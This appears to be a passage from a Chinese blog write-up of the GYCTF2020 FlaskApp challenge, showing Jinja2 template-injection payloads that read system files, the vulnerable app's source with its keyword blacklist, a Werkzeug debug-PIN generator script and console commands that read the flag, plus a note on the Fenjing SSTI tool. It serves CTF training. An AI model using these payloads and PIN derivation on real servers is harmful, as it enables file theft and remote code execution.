<h2 id="例题FlaskApp"><a href="#例题FlaskApp" class="headerlink" title="例题FlaskApp"></a>例题FlaskApp</h2><p>[GYCTF2020]FlaskApp - <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GYCTF2020]FlaskApp">https://buuoj.cn/challenges#[GYCTF2020]FlaskApp</a><br>首页直接就提示pin<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702182532.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702182546.png"><br>在解密页，随便输入点垃圾数据，就会弹出debug的报错，并且还可以看到他的部分源码<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702182745.png"><br>发现他是先解密之后通过<code>render_template_string(tmp)</code>进行渲染，下面组装一个可以读取文件的payload，通过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">e3snJy5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKX19</span><br></pre></td></tr></table></figure>
<p>发现只要是运行<code>__subclasses__()</code>返回就是502，这里不和多废话，直接通过通用payload拿到他这个程序的源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span><br></pre></td></tr></table></figure>
<p>拿到的源码(源码返回的是html编码，需要用赛博厨子解码一下)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, request, flash, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;s_e_c_r_e_t_k_e_y&quot;</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&quot;BASE64加密&quot;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&quot;提交&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&quot;BASE64解密&quot;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&quot;提交&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">        black_list = [</span><br><span class="line">            <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            <span class="string">&quot;os&quot;</span>,</span><br><span class="line">            <span class="string">&quot;system&quot;</span>,</span><br><span class="line">            <span class="string">&quot;popen&quot;</span>,</span><br><span class="line">            <span class="string">&quot;import&quot;</span>,</span><br><span class="line">            <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">            <span class="string">&quot;chr&quot;</span>,</span><br><span class="line">            <span class="string">&quot;request&quot;</span>,</span><br><span class="line">            <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">            <span class="string">&quot;commands&quot;</span>,</span><br><span class="line">            <span class="string">&quot;socket&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hex&quot;</span>,</span><br><span class="line">            <span class="string">&quot;base64&quot;</span>,</span><br><span class="line">            <span class="string">&quot;*&quot;</span>,</span><br><span class="line">            <span class="string">&quot;?&quot;</span>,</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower():</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&quot;/hint&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">        txt = <span class="string">&quot;失败乃成功之母！！&quot;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>, txt=txt)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">        <span class="keyword">if</span> request.values.get(<span class="string">&quot;text&quot;</span>):</span><br><span class="line">            text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">            text_decode = base64.b64encode(text.encode())</span><br><span class="line">            tmp = <span class="string">&quot;结果 :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode()))</span><br><span class="line">            res = render_template_string(tmp)</span><br><span class="line">            flash(tmp)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;encode&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            text = <span class="string">&quot;&quot;</span></span><br><span class="line">            form = NameForm(text)</span><br><span class="line">            <span class="keyword">return</span> render_template(</span><br><span class="line">                <span class="string">&quot;index.html&quot;</span>, form=form, method=<span class="string">&quot;加密&quot;</span>, img=<span class="string">&quot;flask.png&quot;</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&quot;/decode&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">        <span class="keyword">if</span> request.values.get(<span class="string">&quot;text&quot;</span>):</span><br><span class="line">            text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">            text_decode = base64.b64decode(text.encode())</span><br><span class="line">            tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">            <span class="keyword">if</span> waf(tmp):</span><br><span class="line">                flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;decode&quot;</span>))</span><br><span class="line">            res = render_template_string(tmp)</span><br><span class="line">            flash(res)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;decode&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            text = <span class="string">&quot;&quot;</span></span><br><span class="line">            form = NameForm1(text)</span><br><span class="line">            <span class="keyword">return</span> render_template(</span><br><span class="line">                <span class="string">&quot;index.html&quot;</span>, form=form, method=<span class="string">&quot;解密&quot;</span>, img=<span class="string">&quot;flask1.png&quot;</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&quot;/&lt;name&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">name</span>):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>waf过滤一些内容，如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,<span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>,]</span><br></pre></td></tr></table></figure>
<p>其实这些单词还是比较容易绕过的，通过<code>+</code>拼接就没问题，甚至用进制的方式，这里可以通过下面的payload依次读取生成pin码所需要的数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># passwd 1000 flaskweb</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9wYXNzd2QnLCdyJykucmVhZCgpIH19eyUgZW5kaWYgJX17JSBlbmRmb3IgJX0=</span><br><span class="line"><span class="comment"># mac address 42:ca:61:23:36:1d</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3N5cy9jbGFzcy9uZXQvZXRoMC9hZGRyZXNzJywncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span><br><span class="line"><span class="comment"># host id </span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/machine-id&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3Byb2Mvc2VsZi9jZ3JvdXAnLCdyJykucmVhZCgpIH19eyUgZW5kaWYgJX17JSBlbmRmb3IgJX0=</span><br><span class="line"><span class="comment"># 读取cgroup发现不对，所以尝试machine-id 1408f836b0ca514d796cbf8960e45fa1</span></span><br></pre></td></tr></table></figure>
<p>除了固定的之外，在debug报错界面可以获取到app.py的绝对位置<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702194840.png"><br><code>/usr/local/lib/python3.7/site-packages/flask/app.py</code><br>跑一下脚本(老版本的这是)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&quot;flaskweb&quot;</span>  <span class="comment"># username 可通过/etc/passwd获取</span></span><br><span class="line">    <span class="string">&quot;flask.app&quot;</span>,  <span class="comment"># modname默认值</span></span><br><span class="line">    <span class="string">&quot;Flask&quot;</span>,  <span class="comment"># 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&quot;/usr/local/lib/python3.7/site-packages/flask/app.py&quot;</span>,  <span class="comment"># 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&quot;73436980524573&quot;</span>,  <span class="comment"># /sys/class/net/eth0/address mac地址十进制</span></span><br><span class="line">    <span class="string">&quot;1408f836b0ca514d796cbf8960e45fa1&quot;</span>,</span><br><span class="line">    <span class="comment"># 字符串合并：首先读取文件内容 /etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id   /proc/self/cgroup</span></span><br><span class="line">    <span class="comment"># 有machine-id 那就拼接machine-id + /proc/self/cgroup  否则 /proc/sys/kernel/random/boot_id + /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&quot;__wzd&quot;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = (<span class="string">&quot;%09d&quot;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<p>即<code>594-730-022</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&quot;cd /;ls &quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\nthis_is_the_flag.txt\ntmp\nusr\nvar\n&#x27;</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;/app\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&quot;cat /this_is_the_flag.txt&quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;flag&#123;d4aa5bbb-c2c7-4c02-b775-1ece8df35c88&#125;\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>


<h1 id="通杀工具-焚靖"><a href="#通杀工具-焚靖" class="headerlink" title="通杀工具-焚靖"></a>通杀工具-焚靖</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>项目地址： <a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing.git">https://github.com/Marven11/Fenjing.git</a><br>SSTI大部分基础题目全都通杀</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install fenjing</span><br></pre></td></tr></table></figure>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure>
<p>测试题目<code>综合符号加数字过滤绕过</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702201232.png"></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"># CTF</a>
              <a href="/tags/WEB/" rel="tag"># WEB</a>
              <a href="/tags/Python/" rel="tag"># Python</a>
              <a href="/tags/Flask/" rel="tag"># Flask</a>
              <a href="/tags/SSTI/" rel="tag"># SSTI</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/06/24/WEB-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/" rel="prev" title="WEB-PHP反序列化总结">
                  <i class="fa fa-angle-left"></i> WEB-PHP反序列化总结
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments" id="waline"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">BoyChai</span>
    <a href="/atom.xml" target="_blank">RSS</a>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">158k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">9:36</span>
  </span>
</div>
<div class="busuanzi-count">
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动 
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>
<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"waline-server-ten-phi.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":false,"pageview":false,"avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"requiredMeta":["nick","mail"],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2025/07/02/WEB-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"}</script>
<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
<script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
  ).then(() => 
    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
  );
});
</script>

</body>
</html>
